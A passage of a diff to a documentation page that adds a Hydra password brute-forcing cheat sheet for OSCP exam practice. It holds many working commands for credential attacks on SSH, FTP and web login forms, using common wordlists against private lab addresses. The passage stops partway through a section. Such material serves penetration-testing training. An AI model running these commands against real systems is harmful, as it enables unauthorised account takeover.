+      Common OSCP Scenarios
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Common OSCP Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-basic-web-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 1: Basic Web Login
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-ssh-with-custom-port" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 2: SSH with Custom Port
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-wordpress-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 3: WordPress Login
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-4-smb-with-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 4: SMB with Domain
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Troubleshooting
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Issues
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#debugging-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Debugging Tips
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#performance-optimization" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performance Optimization
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Performance Optimization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#speed-vs-stealth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Speed vs Stealth
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wordlist-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Wordlist Strategy
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Reference
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Quick Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#essential-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Essential Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Flags
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pro-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pro Tips
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#most-common-oscp-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Most Common OSCP Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remember" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remember
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -2861,10 +4373,677 @@
 
 
 
-<h1 id="hydra-usage">Hydra Usage</h1>
-<h2 id="ftp">FTP</h2>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>hydra<span class="w"> </span>-C<span class="w"> </span>/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt<span class="w"> </span><span class="m">192</span>.168.168.52<span class="w"> </span>ftp
+<h1 id="hydra-cheatsheet-for-oscp">Hydra Cheatsheet for OSCP</h1>
+<h2 id="overview">Overview</h2>
+<p>Hydra is a powerful password brute-forcing tool supporting numerous protocols. This cheatsheet covers practical usage for OSCP exam scenarios, with emphasis on web attacks.</p>
+<hr />
+<h2 id="basic-syntax">Basic Syntax</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>hydra<span class="w"> </span><span class="o">[</span>OPTIONS<span class="o">]</span><span class="w"> </span>TARGET<span class="w"> </span>PROTOCOL
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="c1"># Common options:</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>-l<span class="w"> </span>LOGIN<span class="w">         </span><span class="c1"># Single username</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>-L<span class="w"> </span>FILE<span class="w">          </span><span class="c1"># Username list</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>-p<span class="w"> </span>PASS<span class="w">          </span><span class="c1"># Single password  </span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>-P<span class="w"> </span>FILE<span class="w">          </span><span class="c1"># Password list</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>-C<span class="w"> </span>FILE<span class="w">          </span><span class="c1"># Colon-separated user:pass list</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>-s<span class="w"> </span>PORT<span class="w">          </span><span class="c1"># Custom port</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>-t<span class="w"> </span>TASKS<span class="w">         </span><span class="c1"># Parallel tasks (default: 16)</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>-w<span class="w"> </span>TIMEOUT<span class="w">       </span><span class="c1"># Wait time for responses</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>-v<span class="w"> </span>/<span class="w"> </span>-V<span class="w">          </span><span class="c1"># Verbose output</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>-f<span class="w">               </span><span class="c1"># Stop when login found</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>-o<span class="w"> </span>FILE<span class="w">          </span><span class="c1"># Output results to file</span>
 </span></code></pre></div>
+<hr />
+<h2 id="common-wordlists">Common Wordlists</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># SecLists (must have)</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>/usr/share/seclists/Usernames/top-usernames-shortlist.txt
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="c1"># RockYou</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>/usr/share/wordlists/rockyou.txt
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="c1"># Custom lists</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>/usr/share/wordlists/fasttrack.txt
+</span></code></pre></div>
+<hr />
+<h2 id="ssh-brute-force">SSH Brute Force</h2>
+<h3 id="basic-ssh-attack">Basic SSH Attack</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Single user, password list</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># User list, single password</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span>password123<span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1"># User list and password list</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="c1"># Custom port</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ssh://192.168.1.100:2222
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-s<span class="w"> </span><span class="m">2222</span><span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>ssh
+</span></code></pre></div>
+<h3 id="advanced-ssh-options">Advanced SSH Options</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Faster attack with more threads</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Stop after first valid login</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-f<span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># Verbose output</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-V<span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1"># Save results</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-o<span class="w"> </span>ssh_results.txt<span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="c1"># Combined user:pass file</span>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>hydra<span class="w"> </span>-C<span class="w"> </span>/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt<span class="w"> </span>ssh://192.168.1.100
+</span></code></pre></div>
+<hr />
+<h2 id="ftp-brute-force">FTP Brute Force</h2>
+<h3 id="basic-ftp-attack">Basic FTP Attack</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Single user</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ftp://192.168.1.100
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Multiple users</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ftp://192.168.1.100
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1"># Default credentials</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>hydra<span class="w"> </span>-C<span class="w"> </span>/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt<span class="w"> </span>ftp://192.168.1.100
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="c1"># Anonymous FTP check</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>anonymous<span class="w"> </span>-p<span class="w"> </span>anonymous<span class="w"> </span>ftp://192.168.1.100
+</span></code></pre></div>
+<h3 id="ftp-custom-port">FTP Custom Port</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Non-standard port</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ftp://192.168.1.100:2121
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-s<span class="w"> </span><span class="m">2121</span><span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>ftp
+</span></code></pre></div>
+<hr />
+<h2 id="http-post-form-attacks">HTTP POST Form Attacks</h2>
+<h3 id="basic-post-form">Basic POST Form</h3>
+<p><strong>Syntax:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>USERNAME<span class="w"> </span>-P<span class="w"> </span>PASSWORDS<span class="w"> </span>IP<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/path:user=^USER^&amp;pass=^PASS^:F=incorrect&quot;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># Components:</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># /path           - Login page path</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># ^USER^          - Username placeholder</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1"># ^PASS^          - Password placeholder</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># F=incorrect     - Failure string (text appearing on failed login)</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="c1"># S=success       - Success string (alternative to F=)</span>
+</span></code></pre></div></p>
+<h3 id="common-post-form-examples">Common POST Form Examples</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Basic login form</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:F=incorrect&quot;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># With different parameter names</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/admin/login.php:user=^USER^&amp;pass=^PASS^:F=Invalid credentials&quot;</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># WordPress login</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=ERROR&quot;</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="c1"># Custom port</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-s<span class="w"> </span><span class="m">8080</span><span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login:username=^USER^&amp;password=^PASS^:F=failed&quot;</span>
+</span></code></pre></div>
+<h3 id="post-form-with-success-string">POST Form with Success String</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Using success string instead of failure</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:S=Welcome&quot;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># Case-insensitive success string</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:S=dashboard&quot;</span>
+</span></code></pre></div>
+<h3 id="post-form-with-custom-headers">POST Form with Custom Headers</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Add custom headers</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:F=incorrect:H=User-Agent: Mozilla/5.0&quot;</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c1"># Multiple headers (separate with newline)</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:F=failed:H=User-Agent: Mozilla/5.0\nReferer: http://192.168.1.100/&quot;</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="c1"># With custom Content-Type</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/api/login:username=^USER^&amp;password=^PASS^:F=error:H=Content-Type: application/x-www-form-urlencoded&quot;</span>
+</span></code></pre></div>
+<h3 id="post-form-with-cookies">POST Form with Cookies</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Static cookie</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:F=incorrect:H=Cookie: PHPSESSID=abc123&quot;</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># Multiple cookies</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:F=failed:H=Cookie: session=xyz; security=low&quot;</span>
+</span></code></pre></div>
+<h3 id="post-form-with-csrf-token">POST Form with CSRF Token</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Static CSRF token (if token doesn&#39;t change)</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^&amp;csrf_token=TOKEN_VALUE:F=incorrect&quot;</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># With cookie and CSRF</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^&amp;token=abc123:F=failed:H=Cookie: PHPSESSID=xyz&quot;</span>
+</span></code></pre></div>
+<h3 id="complex-post-form-examples">Complex POST Form Examples</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Login with remember me checkbox</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login:user=^USER^&amp;pass=^PASS^&amp;remember=on:F=Login failed&quot;</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c1"># Hidden fields</span>
